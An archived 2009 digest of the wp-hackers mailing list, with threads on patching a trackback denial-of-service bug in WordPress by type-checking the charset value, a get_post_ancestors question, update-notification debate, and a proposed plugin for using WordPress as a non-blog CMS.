Date: Wed, 21 Oct 2009 09:41:12 -0500
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <427667db0910201659n337e6c0coa103557148ac1456@mail.gmail.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com> 
	<4ADDCB1D.5070707@gaarai.com> <p06240808c7037d801d53@192.168.1.64> 
	<427667db0910201659n337e6c0coa103557148ac1456@mail.gmail.com>
Message-ID: <161617690910210741l8cdfa24w785780bbf582d24@mail.gmail.com>

It fixes the exploit in particular, but not the underlying issue. A
trivial change to the exploit can still trigger it. To fix the problem
itself, there needs to be an additional change.


Make this:

if ($charset)
	$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
else
	$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';


into this:

if ($charset && is_string($charset))
	$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
else
	$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';


That will correct another vector for the same attack.

-Otto



On Tue, Oct 20, 2009 at 6:59 PM, Lynne Pope <lynne.pope at gmail.com> wrote:
> WordPress 2.8.5: Hardening Release http://j.mp/3gZDRS
>
> This should fix the new 0-day exploit.
>
> Lynne
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Wed Oct 21 15:23:17 2009
From: scribu at gmail.com (scribu)
Date: Wed, 21 Oct 2009 18:23:17 +0300
Subject: [wp-hackers] get_post_ancestors() inside a custom function
In-Reply-To: <a21f8bf00910210717j248ad29dq360d1a1437de3d56@mail.gmail.com>
References: <a21f8bf00910210717j248ad29dq360d1a1437de3d56@mail.gmail.com>
Message-ID: <349fe48b0910210823x59d5966bx46087a2b36b1ab5e@mail.gmail.com>

>
> Is there any reason that get_post_ancestors() wouldn't work inside a custom
> function?
>

No, there's no reason that I can think of.

Try the code directly, i.e. in functions.php simply write:

var_dump(get_post_ancestors($some_id));

If it's working there, you should probably contact the plugin author, as
it's not an issue with WP Core.


-- 
http://scribu.net

From g30rg3x at gmail.com  Wed Oct 21 15:26:30 2009
From: g30rg3x at gmail.com (g30rg3_x)
Date: Wed, 21 Oct 2009 10:26:30 -0500
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <161617690910210741l8cdfa24w785780bbf582d24@mail.gmail.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com>
	<4ADDCB1D.5070707@gaarai.com> <p06240808c7037d801d53@192.168.1.64>
	<427667db0910201659n337e6c0coa103557148ac1456@mail.gmail.com>
	<161617690910210741l8cdfa24w785780bbf582d24@mail.gmail.com>
Message-ID: <d5d5430f0910210826l505a4097xe893a37ee8bdc99b@mail.gmail.com>

Hi Otto,

Thats the same i think after i see the patch by ryan...
But after a more closer look i see that strtoupper() and trim()
actually workaround/fix that issue when charset is and a array of
charsets.

A simple test script made to prove this point...
$charset = array('UTF-8','UTF-8','UTF-8');
$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
var_dump($charset);

And this script will just output the next text...
string(5) "ARRAY"

So as you can see, trim takes the array of charset (that in theory if
happens to reach mb_convert_encoding as and array of charsets it will
still be vulnerable to the dos attack) and work with it as and a
string, in case that trim fails, strtoupper will also do the same and
therefore it will convert the array() into a the string "array".
More than be exploitable is just plain bug (with no exploitable issue)
which as you say should be fixed with the proposed patch...

Regards

2009/10/21 Otto <otto at ottodestruct.com>:
> It fixes the exploit in particular, but not the underlying issue. A
> trivial change to the exploit can still trigger it. To fix the problem
> itself, there needs to be an additional change.
>
>
> Make this:
>
> if ($charset)
> ? ? ? ?$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
> else
> ? ? ? ?$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';
>
>
> into this:
>
> if ($charset && is_string($charset))
> ? ? ? ?$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
> else
> ? ? ? ?$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';
>
>
> That will correct another vector for the same attack.
>
> -Otto
>
>
>
> On Tue, Oct 20, 2009 at 6:59 PM, Lynne Pope <lynne.pope at gmail.com> wrote:
>> WordPress 2.8.5: Hardening Release http://j.mp/3gZDRS
>>
>> This should fix the new 0-day exploit.
>>
>> Lynne
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
/**
CONFIDENTIALITY NOTICE: This message is intended to be viewed only by
the listed recipient(s).
It may contain information that is privileged, confidential and/or
exempt from disclosure under applicable law.
Any dissemination, distribution or copying of this message is strictly
prohibited without our prior written permission.
If you are not an intended recipient, or if you have received this
communication in error, please notify us immediately by return e-mail
and permanently remove the original message and any copies from your
computer and all back-up systems.
*/
_________________________
             g30rg3_x

From otto at ottodestruct.com  Wed Oct 21 15:37:03 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 21 Oct 2009 10:37:03 -0500
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <d5d5430f0910210826l505a4097xe893a37ee8bdc99b@mail.gmail.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com> 
	<4ADDCB1D.5070707@gaarai.com> <p06240808c7037d801d53@192.168.1.64> 
	<427667db0910201659n337e6c0coa103557148ac1456@mail.gmail.com> 
	<161617690910210741l8cdfa24w785780bbf582d24@mail.gmail.com> 
	<d5d5430f0910210826l505a4097xe893a37ee8bdc99b@mail.gmail.com>
Message-ID: <161617690910210837t217d2a10k3bfbb4615649b4e9@mail.gmail.com>

Hmm... While the trim does eliminate the issue, it seems to be
dependent upon which version of PHP you're using. When I tried it with
5.3, I get a null back instead of "array". It is conceivable (though
it would take a lot of testing) that some particular version of PHP,
or combination of extensions, could make a site vulnerable.

Essentially, it depends the behavior of trim. I has assumed that
passing trim an array would cause a warning (it does), and then
continue at the next code segment. In your case, it converts to the
string "array". In mine, I get a null value from it. However in both
cases, the $charset does get overwritten with that value.

Still, I don't think it's a great idea to rely on undocumented
behavior to prevent the issue here, but I do agree that it is not a
pressing problem.

-Otto



On Wed, Oct 21, 2009 at 10:26 AM, g30rg3_x <g30rg3x at gmail.com> wrote:
> Hi Otto,
>
> Thats the same i think after i see the patch by ryan...
> But after a more closer look i see that strtoupper() and trim()
> actually workaround/fix that issue when charset is and a array of
> charsets.
>
> A simple test script made to prove this point...
> $charset = array('UTF-8','UTF-8','UTF-8');
> $charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
> var_dump($charset);
>
> And this script will just output the next text...
> string(5) "ARRAY"
>
> So as you can see, trim takes the array of charset (that in theory if
> happens to reach mb_convert_encoding as and array of charsets it will
> still be vulnerable to the dos attack) and work with it as and a
> string, in case that trim fails, strtoupper will also do the same and
> therefore it will convert the array() into a the string "array".
> More than be exploitable is just plain bug (with no exploitable issue)
> which as you say should be fixed with the proposed patch...
>
> Regards
>
> 2009/10/21 Otto <otto at ottodestruct.com>:
>> It fixes the exploit in particular, but not the underlying issue. A
>> trivial change to the exploit can still trigger it. To fix the problem
>> itself, there needs to be an additional change.
>>
>>
>> Make this:
>>
>> if ($charset)
>> ? ? ? ?$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
>> else
>> ? ? ? ?$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';
>>
>>
>> into this:
>>
>> if ($charset && is_string($charset))
>> ? ? ? ?$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
>> else
>> ? ? ? ?$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';
>>
>>
>> That will correct another vector for the same attack.
>>
>> -Otto
>>
>>
>>
>> On Tue, Oct 20, 2009 at 6:59 PM, Lynne Pope <lynne.pope at gmail.com> wrote:
>>> WordPress 2.8.5: Hardening Release http://j.mp/3gZDRS
>>>
>>> This should fix the new 0-day exploit.
>>>
>>> Lynne
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> /**
> CONFIDENTIALITY NOTICE: This message is intended to be viewed only by
> the listed recipient(s).
> It may contain information that is privileged, confidential and/or
> exempt from disclosure under applicable law.
> Any dissemination, distribution or copying of this message is strictly
> prohibited without our prior written permission.
> If you are not an intended recipient, or if you have received this
> communication in error, please notify us immediately by return e-mail
> and permanently remove the original message and any copies from your
> computer and all back-up systems.
> */
> _________________________
> ? ? ? ? ? ? g30rg3_x
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From g30rg3x at gmail.com  Wed Oct 21 16:09:33 2009
From: g30rg3x at gmail.com (g30rg3_x)
Date: Wed, 21 Oct 2009 11:09:33 -0500
Subject: [wp-hackers] Plugin to stop wp-trackback DOS attack
In-Reply-To: <161617690910210837t217d2a10k3bfbb4615649b4e9@mail.gmail.com>
References: <7474be390910200731g4a405b5dj30c8e4472f91875e@mail.gmail.com>
	<4ADDCB1D.5070707@gaarai.com> <p06240808c7037d801d53@192.168.1.64>
	<427667db0910201659n337e6c0coa103557148ac1456@mail.gmail.com>
	<161617690910210741l8cdfa24w785780bbf582d24@mail.gmail.com>
	<d5d5430f0910210826l505a4097xe893a37ee8bdc99b@mail.gmail.com>
	<161617690910210837t217d2a10k3bfbb4615649b4e9@mail.gmail.com>
Message-ID: <d5d5430f0910210909j22a722c7qc48a9c6c64354d31@mail.gmail.com>

m using php 5.2.6...
And it only notices about the implicit conversion if obviously notices
are turned on.
I do believe that it should be patch with the your proposal, cause the
script is actually expecting a string not and array...

Regards

2009/10/21 Otto <otto at ottodestruct.com>:
> Hmm... While the trim does eliminate the issue, it seems to be
> dependent upon which version of PHP you're using. When I tried it with
> 5.3, I get a null back instead of "array". It is conceivable (though
> it would take a lot of testing) that some particular version of PHP,
> or combination of extensions, could make a site vulnerable.
>
> Essentially, it depends the behavior of trim. I has assumed that
> passing trim an array would cause a warning (it does), and then
> continue at the next code segment. In your case, it converts to the
> string "array". In mine, I get a null value from it. However in both
> cases, the $charset does get overwritten with that value.
>
> Still, I don't think it's a great idea to rely on undocumented
> behavior to prevent the issue here, but I do agree that it is not a
> pressing problem.
>
> -Otto
>
>
>
> On Wed, Oct 21, 2009 at 10:26 AM, g30rg3_x <g30rg3x at gmail.com> wrote:
>> Hi Otto,
>>
>> Thats the same i think after i see the patch by ryan...
>> But after a more closer look i see that strtoupper() and trim()
>> actually workaround/fix that issue when charset is and a array of
>> charsets.
>>
>> A simple test script made to prove this point...
>> $charset = array('UTF-8','UTF-8','UTF-8');
>> $charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
>> var_dump($charset);
>>
>> And this script will just output the next text...
>> string(5) "ARRAY"
>>
>> So as you can see, trim takes the array of charset (that in theory if
>> happens to reach mb_convert_encoding as and array of charsets it will
>> still be vulnerable to the dos attack) and work with it as and a
>> string, in case that trim fails, strtoupper will also do the same and
>> therefore it will convert the array() into a the string "array".
>> More than be exploitable is just plain bug (with no exploitable issue)
>> which as you say should be fixed with the proposed patch...
>>
>> Regards
>>
>> 2009/10/21 Otto <otto at ottodestruct.com>:
>>> It fixes the exploit in particular, but not the underlying issue. A
>>> trivial change to the exploit can still trigger it. To fix the problem
>>> itself, there needs to be an additional change.
>>>
>>>
>>> Make this:
>>>
>>> if ($charset)
>>> ? ? ? ?$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
>>> else
>>> ? ? ? ?$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';
>>>
>>>
>>> into this:
>>>
>>> if ($charset && is_string($charset))
>>> ? ? ? ?$charset = str_replace( array(',', ' '), '', strtoupper( trim($charset) ) );
>>> else
>>> ? ? ? ?$charset = 'ASCII, UTF-8, ISO-8859-1, JIS, EUC-JP, SJIS';
>>>
>>>
>>> That will correct another vector for the same attack.
>>>
>>> -Otto
>>>
>>>
>>>
>>> On Tue, Oct 20, 2009 at 6:59 PM, Lynne Pope <lynne.pope at gmail.com> wrote:
>>>> WordPress 2.8.5: Hardening Release http://j.mp/3gZDRS
>>>>
>>>> This should fix the new 0-day exploit.
>>>>
>>>> Lynne
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> /**
>> CONFIDENTIALITY NOTICE: This message is intended to be viewed only by
>> the listed recipient(s).
>> It may contain information that is privileged, confidential and/or
>> exempt from disclosure under applicable law.
>> Any dissemination, distribution or copying of this message is strictly
>> prohibited without our prior written permission.
>> If you are not an intended recipient, or if you have received this
>> communication in error, please notify us immediately by return e-mail
>> and permanently remove the original message and any copies from your
>> computer and all back-up systems.
>> */
>> _________________________
>> ? ? ? ? ? ? g30rg3_x
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
_________________________
             g30rg3_x

From wp-hackers at striderweb.com  Wed Oct 21 19:22:27 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 14:22:27 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
Message-ID: <F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>


On Oct 21, 2009, at 9:03 AM, Otto wrote:

> A site that the admin has not visited in 2 months is, IMO, a dead
> site. No new content, no readers, nobody caring for it...

Otto, I respect your contributions to WordPress, and this isn't only  
directed at you.  But...

In the past, I've asked for advice on using WordPress as a straight  
CMS rather than a blog platform.  Such questions are routinely  
answered with remarks along the lines of, "It is a CMS, Dummy."*

Fine it's a CMS.  But as such we must accept that many users are using  
WordPress to set up their sites, and edit them when needed, but are  
NOT routinely adding new content, /a la/ a blog.  In such  
circumstances, a site can **easily** go two months without being  
updated.

I just don't understand this "screw 'em" attitude.  There is a  
legitimate need here, and insisting that those users are just clueless  
lusers seems arrogant to me.

I'm starting to lean toward the argument that changing the default  
blog post may be the best solution. Great, so let's do it.  While  
we're at it, let's add a note in Admin (the Tools page maybe?) that  
also talks about the notification list.

But please stop staring down your nose at a large (and growing)  
section of WordPress users.  It does the platform a grave disservice  
if only the "cool kids" are allowed to play.

(As a side note -- I do swing dance as a hobby, and there used to be a  
swing club/bar in Chicago that I loved to go to.  One night I took my  
brother along, thinking he might like the atmosphere.  His comment  
later what that the whole place gave him a feeling that "this is a  
private club and you're not a member".  The place closed down about a  
year after it opened -- probably exactly for the reason that it  
couldn't get customers beyond those who were "in the club".  I never  
noticed it myself, because I was a "member" without realizing it.)

Sincerely,

Stephen

* The attitude toward people asking about "WordPress as CMS" is  
widespread and wrongheaded (including coming from one developer with  
whom I've had a very friendly relationship.)  As long as the "blog  
post" aspect is front and center, people will -- legitimately --  
consider it "blog software".  Personally I would love to see a plugin  
that entirely removes or conceals the post/comment areas of the  
admin.  Perhaps my next project....

-- 
Stephen Rider
http://striderweb.com/


From steve at sltaylor.co.uk  Wed Oct 21 19:30:19 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Wed, 21 Oct 2009 20:30:19 +0100
Subject: [wp-hackers] get_post_ancestors() inside a custom function
In-Reply-To: <349fe48b0910210823x59d5966bx46087a2b36b1ab5e@mail.gmail.com>
References: <a21f8bf00910210717j248ad29dq360d1a1437de3d56@mail.gmail.com>
	<349fe48b0910210823x59d5966bx46087a2b36b1ab5e@mail.gmail.com>
Message-ID: <a21f8bf00910211230h62521467j97068dd5165dfe95@mail.gmail.com>

Thanks, scribu. Yes, the simple use of the get_post_ancestors()
outside any functions (in my theme's functions.php) works fine.

I'm out of look contacting the plugin author - it's me! I mentioned
Justin Tadlock's Members plugin as background to explain the
unorthodox capability referenced in my code.

FYI I'm basing my plugin on this:
http://pressography.com/plugin_template.txt  Seems generally solid.
The function I posted is a method of the plugin class.

Steve

From ncrice at gmail.com  Wed Oct 21 19:38:26 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Wed, 21 Oct 2009 15:38:26 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
Message-ID: <862d087f0910211238u3e692b1ft555da28d5069728f@mail.gmail.com>

Stephen,
Your email illustrates the problem very well. Otto (with all due respect)
can't fathom a circumstance where an email would be helpful to users as a
reminder that there is a new version available. He can't imagine a person
who won't install the plugin (because they don't know it exists), who
doesn't log in to their admin every day, and who doesn't subscribe to all
the WordPress feeds or mailing lists, yet needs these reminders.

And if they do exist, they (due to their utter n00bness) deserve to get
hacked or shouldn't be using WordPress to begin with. Screw 'em.

I think some of us have been power users too long.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com

From wp-hackers at striderweb.com  Wed Oct 21 19:47:29 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 14:47:29 -0500
Subject: [wp-hackers] Canonical "one time" plugins?
Message-ID: <CADFEB1C-716B-4592-B9DC-B9F3A606BC0E@striderweb.com>

Hi all --

A discussion recently came up regarding whether or not the Hello Dolly  
plugin should remain part of the default download.  Arguments against  
were generally that they had to delete the thing again every time they  
updated the site.

This reminds me of a separate discussion a while back as to whether  
the Import functions should be moved to a plugin, as that is something  
that is generally used once and then never needed again.

It occurs to me:  Would it be possible to set the downloads up so that  
if a person goes to wordpress.org and downloads the zip file, (usually  
a new user), they get certain plugins, but that those plugins are  
*not* included in automatic updates?  (Or perhaps included in  
automatic updates *only* if they are still installed on the site?)

That way, Hello Dolly/Akismet/Import/whatever could be included, but  
if a user deletes it, it isn't recreated on every update.  The same  
for the Import plugin.  There could be a lot of things that would be  
useful to include as "canonical" plugins for new setups that are  
handled this way.

Thoughts?

Stephen

From mikeschinkel at newclarity.net  Wed Oct 21 19:52:09 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Oct 2009 15:52:09 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910211238u3e692b1ft555da28d5069728f@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<346205A2-D8B1-406B-8300-046C070EC66B@striderweb.com>
	<f38206c90910190752p6257046bk217941cabb21feed@mail.gmail.com>
	<Aq1KYaBI3J3KFwZ9@dsl-217-155-35-239.zen.co.uk>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<862d087f0910211238u3e692b1ft555da28d5069728f@mail.gmail.com>
Message-ID: <D9EC7114-EF77-4035-A5BA-1E026F9FD3CE@newclarity.net>

> I think some of us have been power users too long.

Amen.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/


From wp-hackers at striderweb.com  Wed Oct 21 20:00:13 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 15:00:13 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
Message-ID: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>

Note:  This email repeats a lot of things I said in another email, for  
the benefit of those who are not following the Security thread.  For  
those who *are* following that thread, please skim to the bottom, as I  
pose a new and separate question from the security issues discussed  
elsewhere....

On Oct 21, 2009, at 9:03 AM, Otto wrote:

> A site that the admin has not visited in 2 months is, IMO, a dead
> site. No new content, no readers, nobody caring for it...

In the past, I've asked for advice on using WordPress as a straight  
CMS rather than a blog platform.  Such questions are routinely  
answered with remarks along the lines of, "It is a CMS, Dummy."

Fine it's a CMS.  But as such we must accept that many users are using  
WordPress to set up their sites, and edit them when needed, but are  
NOT routinely adding new content, /a la/ a blog.  In such  
circumstances, a site can **easily** go two months without being  
updated.

I just don't understand this "screw 'em" attitude.  The attitude  
toward people asking about "WordPress as CMS" is widespread and  
wrongheaded (including coming from one developer with whom I've had a  
very friendly relationship.)  As long as the "blog post" aspect is  
front and center, people will -- legitimately -- consider it "blog  
software".

Personally I would love to see a plugin that entirely removes or  
conceals the post/comment areas of the admin, and I'm considering  
making one.

The Big Question:  What would a "CMS" plugin have to do?  Pots and  
comments are woven throughout the Admin, and I'd like to remove all  
aspects of them from the menus.  My "to do" list is below -- if I'm  
missing something, or if you have advice as to how to do some of this,  
I would appreciate.

	1) Remove "Posts" and "Comments" from main menu.  (Am I correct that  
direct links will still work?  Is there a way to remove those areas  
entirely rather than just hiding the menu items?)

	2) Remove "Recent Comments" and "QuickPress" from Dashboard.  (Again,  
can it be removed entirely or merely hidden?)

	3) Remove "Press This" from Tools page (how?)

	4) Writing Settings page -- remove/hide/turn off "Remote Publishing",  
"Post Via Email", and "Update Services" settings

	5) Reading Settings page -- remove "Front Page Displays" option.  Set  
it to "static page".  Still must allow user to set the static page  
though.

	(Since we're changing those two pages so much, perhaps remove them  
entirely and replace them with a new consolidated page?)

	6) Remove "Discussion" settings page entirely.  Set default  
preferences to no comments or notifications.

	7) Remove "Discussion" meta box from Edit Page page.

	8) Remove Tags/Categories from Permalink Settings page

Also, in general, I think WordPress itself should do a few things to  
lessen the "blog assumption".  Nothing major, but a few small things  
to consider:

	1) On General Settings page, change "Blog Title" and "Blog Address"  
to "Site Title" and "Site Address"

	2) Ditto "Privacy" page.  "Blog" s/b "Site"

Good idea?  Bad?  Discuss!

Stephen

-- 
Stephen Rider
http://striderweb.com/


From ncrice at gmail.com  Wed Oct 21 20:05:40 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Wed, 21 Oct 2009 16:05:40 -0400
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
Message-ID: <862d087f0910211305i1b0a32eaga4574713316419ec@mail.gmail.com>

You're most likely about to be told either:

1) If you want a website CMS (non-blog) then try drupal/joomla/EE
2) If you MUST use WP as a site CMS (non-blog) just tell your client to
ignore the blog stuff.

Good luck.

FWIW, I like the idea of a lightweight plugin that does nothing but remove
all references to blog posts, comments, etc. I think it's a fine idea.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com


On Wed, Oct 21, 2009 at 4:00 PM, Stephen Rider <wp-hackers at striderweb.com>wrote:

> Note:  This email repeats a lot of things I said in another email, for the
> benefit of those who are not following the Security thread.  For those who
> *are* following that thread, please skim to the bottom, as I pose a new and
> separate question from the security issues discussed elsewhere....
>
> On Oct 21, 2009, at 9:03 AM, Otto wrote:
>
>  A site that the admin has not visited in 2 months is, IMO, a dead
>> site. No new content, no readers, nobody caring for it...
>>
>
> In the past, I've asked for advice on using WordPress as a straight CMS
> rather than a blog platform.  Such questions are routinely answered with
> remarks along the lines of, "It is a CMS, Dummy."
>
> Fine it's a CMS.  But as such we must accept that many users are using
> WordPress to set up their sites, and edit them when needed, but are NOT
> routinely adding new content, /a la/ a blog.  In such circumstances, a site
> can **easily** go two months without being updated.
>
> I just don't understand this "screw 'em" attitude.  The attitude toward
> people asking about "WordPress as CMS" is widespread and wrongheaded
> (including coming from one developer with whom I've had a very friendly
> relationship.)  As long as the "blog post" aspect is front and center,
> people will -- legitimately -- consider it "blog software".
>
> Personally I would love to see a plugin that entirely removes or conceals
> the post/comment areas of the admin, and I'm considering making one.
>
> The Big Question:  What would a "CMS" plugin have to do?  Pots and comments
> are woven throughout the Admin, and I'd like to remove all aspects of them
> from the menus.  My "to do" list is below -- if I'm missing something, or if
> you have advice as to how to do some of this, I would appreciate.
>
>        1) Remove "Posts" and "Comments" from main menu.  (Am I correct that
> direct links will still work?  Is there a way to remove those areas entirely
> rather than just hiding the menu items?)
>
>        2) Remove "Recent Comments" and "QuickPress" from Dashboard.
>  (Again, can it be removed entirely or merely hidden?)
>
>        3) Remove "Press This" from Tools page (how?)
>
>        4) Writing Settings page -- remove/hide/turn off "Remote
> Publishing", "Post Via Email", and "Update Services" settings
>
>        5) Reading Settings page -- remove "Front Page Displays" option.
>  Set it to "static page".  Still must allow user to set the static page
> though.
>
>        (Since we're changing those two pages so much, perhaps remove them
> entirely and replace them with a new consolidated page?)
>
>        6) Remove "Discussion" settings page entirely.  Set default
> preferences to no comments or notifications.
>
>        7) Remove "Discussion" meta box from Edit Page page.
>
>        8) Remove Tags/Categories from Permalink Settings page
>
> Also, in general, I think WordPress itself should do a few things to lessen
> the "blog assumption".  Nothing major, but a few small things to consider:
>
>        1) On General Settings page, change "Blog Title" and "Blog Address"
> to "Site Title" and "Site Address"
>
>        2) Ditto "Privacy" page.  "Blog" s/b "Site"
>
> Good idea?  Bad?  Discuss!
>
> Stephen
>
> --
> Stephen Rider
> http://striderweb.com/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From SuperMoonMan at gmail.com  Wed Oct 21 20:06:29 2009
From: SuperMoonMan at gmail.com (Steven Rossi)
Date: Wed, 21 Oct 2009 15:06:29 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
Message-ID: <474320ee0910211306p5766efc9ibca2c4312c920e1@mail.gmail.com>

Sounds great to me! If this hasn't been done before (which to my knowledge,
it hasn't), I can see a big market for it. I've been working towards using
Wordpress in development of more traditional (that is, non-blog) sites, and
it's hard to get around that blog stigma when working in a group environment
with Wordpress.

Perhaps my favorite suggestion in your email is the switch from Blog
Title/Blog Address to Site Title/Site Address. I've always been surprised
that the "Blog" terms have stuck around as long as they have. I'd be all for
a switch.

Steven Rossi
http://www.letsmovetothemoon.com
http://stevenjrossi.com
http://www.twitter.com/supermoonman

On Wed, Oct 21, 2009 at 3:00 PM, Stephen Rider <wp-hackers at striderweb.com>wrote:

> Note:  This email repeats a lot of things I said in another email, for the
> benefit of those who are not following the Security thread.  For those who
> *are* following that thread, please skim to the bottom, as I pose a new and
> separate question from the security issues discussed elsewhere....
>
> On Oct 21, 2009, at 9:03 AM, Otto wrote:
>
>  A site that the admin has not visited in 2 months is, IMO, a dead
>> site. No new content, no readers, nobody caring for it...
>>
>
> In the past, I've asked for advice on using WordPress as a straight CMS
> rather than a blog platform.  Such questions are routinely answered with
> remarks along the lines of, "It is a CMS, Dummy."
>
> Fine it's a CMS.  But as such we must accept that many users are using
> WordPress to set up their sites, and edit them when needed, but are NOT
> routinely adding new content, /a la/ a blog.  In such circumstances, a site
> can **easily** go two months without being updated.
>
> I just don't understand this "screw 'em" attitude.  The attitude toward
> people asking about "WordPress as CMS" is widespread and wrongheaded
> (including coming from one developer with whom I've had a very friendly
> relationship.)  As long as the "blog post" aspect is front and center,
> people will -- legitimately -- consider it "blog software".
